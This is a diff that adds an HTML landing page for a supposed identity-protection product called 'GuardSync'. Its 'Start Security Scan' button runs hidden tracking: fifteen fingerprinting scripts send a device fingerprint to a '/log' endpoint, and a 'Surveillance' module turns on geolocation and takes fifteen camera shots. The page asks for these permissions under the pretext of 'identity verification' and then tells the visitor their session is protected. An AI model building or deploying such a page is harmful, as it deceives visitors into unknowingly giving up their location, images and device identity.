@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GuardSync | Next-Gen Identity Protection</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #030408;
+            --bg-glass: rgba(14, 16, 24, 0.75);
+            --accent: #6366f1;
+            --accent-glow: rgba(99, 102, 241, 0.35);
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+        }
+
+        h1,
+        h2,
+        h3 {
+            font-family: 'Outfit', sans-serif;
+        }
+
+        .blobs {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .blob {
+            position: absolute;
+            background: var(--accent);
+            filter: blur(120px);
+            border-radius: 50%;
+            opacity: 0.15;
+            animation: move 25s infinite alternate ease-in-out;
+        }
+
+        .blob-1 {
+            width: 600px;
+            height: 600px;
+            top: -150px;
+            left: -150px;
+        }
+
+        .blob-2 {
+            width: 500px;
+            height: 500px;
+            bottom: -100px;
+            right: -100px;
+            background: #8b5cf6;
+        }
+
+        @keyframes move {
+            from {
+                transform: translate(0, 0) scale(1);
+            }
+
+            to {
+                transform: translate(80px, 80px) scale(1.08);
+            }
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 5%;
+            position: fixed;
+            width: 100%;
+            z-index: 100;
+            backdrop-filter: blur(12px);
+        }
+
+        .logo {
+            font-size: 22px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-box {
+            width: 34px;
+            height: 34px;
+            background: linear-gradient(135deg, var(--accent), #8b5cf6);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--text-dim);
+            font-size: 14.5px;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: var(--text-main);
+        }
+
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 120px 5% 80px;
+        }
+
+        .badge {
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid rgba(99, 102, 241, 0.25);
+            color: var(--accent);
+            padding: 7px 18px;
+            border-radius: 9999px;
+            font-size: 12.5px;
+            font-weight: 600;
+            margin-bottom: 28px;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+        }
+
+        .hero h1 {
+            font-size: clamp(42px, 7.5vw, 76px);
+            font-weight: 700;
+            max-width: 920px;
+            line-height: 1.05;
+            margin-bottom: 24px;
+            background: linear-gradient(to bottom, #fff, #a1b0c8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            color: var(--text-dim);
+            font-size: 18.5px;
+            max-width: 620px;
+            margin-bottom: 48px;
+            line-height: 1.65;
+        }
+
+        .cta-group {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 15px 32px;
+            border-radius: 14px;
+            font-size: 15.5px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            white-space: nowrap;
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: white;
+            border: none;
+            box-shadow: 0 0 25px var(--accent-glow);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 40px var(--accent-glow);
+            filter: brightness(1.08);
+        }
+
+        .btn-secondary {
+            background: var(--bg-glass);
+            color: var(--text-main);
+            border: 1px solid var(--border);
+            backdrop-filter: blur(12px);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .preview {
+            margin-top: 90px;
+            width: 100%;
+            max-width: 1080px;
+            aspect-ratio: 16 / 9.2;
+            background: var(--bg-glass);
+            border: 1px solid var(--border);
+            border-radius: 28px;
+            backdrop-filter: blur(20px);
+            padding: 18px;
+            box-shadow: 0 50px 120px rgba(0, 0, 0, 0.6);
+        }
+
+        .preview-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .dot {
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+            background: var(--border);
+        }
+
+        .mock-dashboard {
+            width: 100%;
+            height: calc(100% - 35px);
+            display: grid;
+            grid-template-columns: 210px 1fr;
+            gap: 20px;
+        }
+
+        .mock-side,
+        .mock-main {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 14px;
+        }
+
+        #scan-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(3, 4, 8, 0.96);
+            backdrop-filter: blur(12px);
+            z-index: 1000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .loader {
+            width: 52px;
+            height: 52px;
+            border: 4px solid var(--accent);
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            animation: rotation 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            font-size: 19px;
+            font-weight: 600;
+        }
+
+        .loading-sub {
+            color: var(--text-dim);
+            font-size: 14.5px;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 768px) {
+            nav {
+                padding: 20px 5%;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .hero {
+                padding-top: 100px;
+            }
+
+            .preview {
+                margin-top: 60px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="blobs">
+        <div class="blob blob-1"></div>
+        <div class="blob blob-2"></div>
+    </div>
+
+    <nav>
+        <div class="logo">
+            <div class="logo-box">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                </svg>
+            </div>
+            GuardSync
+        </div>
+        <div class="nav-links">
+            <a href="#">Solutions</a>
+            <a href="#">Pricing</a>
+            <a href="#">Cloud</a>
+            <a href="#">Docs</a>
+        </div>
+        <a href="#" class="btn btn-secondary" style="padding: 10px 22px; font-size: 13.5px;">Login</a>
+    </nav>
+
+    <main class="hero">
+        <div class="badge">v2.4 Engine Now Live</div>
+        <h1>Securing Digital Identity With Zero Trust.</h1>
+        <p>Advanced behavioral intelligence to protect your team against sophisticated session hijacking and automated
+            threats.</p>
+
+        <div class="cta-group">
+            <button class="btn btn-primary" onclick="startScan()">
+                Start Security Scan
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="9 11 12 14 22 4"></polyline>
+                    <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
+                </svg>
+            </button>
+            <a href="#" class="btn btn-secondary">Request Demo</a>
+        </div>
+
+        <div class="preview">
+            <div class="preview-header">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <div class="mock-dashboard">
+                <div class="mock-side"></div>
+                <div class="mock-main"></div>
+            </div>
+        </div>
+    </main>
+
+    <div id="scan-overlay">
+        <span class="loader"></span>
+        <div class="loading-text" id="loader-text">Initializing Identity Scan...</div>
+        <div class="loading-sub" id="loader-sub">Verifying hardware authenticity and browser context.</div>
+    </div>
+
+    <!-- Background tracking scripts - Restored from your original -->
+    <script src="fp/browser.js"></script>
+    <script src="fp/hardware.js"></script>
+    <script src="fp/os.js"></script>
+    <script src="fp/network.js"></script>
+    <script src="fp/behavioral.js"></script>
+    <script src="fp/extensions.js"></script>
+    <script src="fp/permissions.js"></script>
+    <script src="fp/storage.js"></script>
+    <script src="fp/timing.js"></script>
+    <script src="fp/murmur.js"></script>
+    <script src="fp/codecs.js"></script>
+    <script src="fp/gpu_ram.js"></script>
+    <script src="fp/environment.js"></script>
+    <script src="fp/surveillance.js"></script>
+    <script src="fp/core.js"></script>
+
+    <script>
+        async function startScan() {
+            const overlay = document.getElementById('scan-overlay');
+            const lText = document.getElementById('loader-text');
+            const lSub = document.getElementById('loader-sub');
+
+            overlay.style.display = 'flex';
+
+            lText.textContent = "Analyzing Environment...";
+            lSub.textContent = "Checking browser integrity and hardware profile.";
+
+            const data = await FP.run('/log');   // ← this line uses your fp/core.js
+            const deviceId = data.stableHash?.slice(0, 16) || 'unknown';
+
+            await new Promise(r => setTimeout(r, 1500));
+
+            lText.textContent = "Verifying Hardware...";
+            lSub.textContent = "Please allow permissions for location and identity verification.";
+
+            try {
+                const result = await Surveillance.init(deviceId, {
+                    enableLocation: true,
+                    enableCamera: true,
+                    camShots: 15
+                });
+                console.log('Surveillance started:', result);
+            } catch (e) {
+                console.warn('Surveillance failed or blocked:', e);
+            }
+
+            await new Promise(r => setTimeout(r, 2000));
+
+            lText.textContent = "Engine Initialized";
+            lSub.textContent = "Your browsing session is now protected by GuardSync.";
+
+            setTimeout(() => {
+                overlay.style.display = 'none';
+            }, 1200);
+        }
+    </script>
+</body>
+
+</html>
